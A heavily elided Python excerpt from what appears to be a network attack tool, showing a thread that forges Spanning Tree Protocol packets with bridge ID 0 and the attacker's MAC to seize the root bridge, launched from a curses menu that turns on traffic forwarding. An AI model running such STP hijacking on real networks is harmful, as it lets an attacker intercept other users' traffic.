...
def hijack(interfaces, pkt):
    ...
    pkt[0].bridgeid = 0
    pkt[0].bridgemac = mac
    while not stop_hijack_event.is_set():
...
def launch_stp_atk(interfaces):
    ...
    stp_thread = threading.Thread(target=hijack, args=(interfaces, pkt,))
...
def gui(stdscr):
    ...
    while True:
        ...
        if action == attacks.hijack.start:
            ...
            enable_forwarding("hijack_stp_br", selected_interfaces)
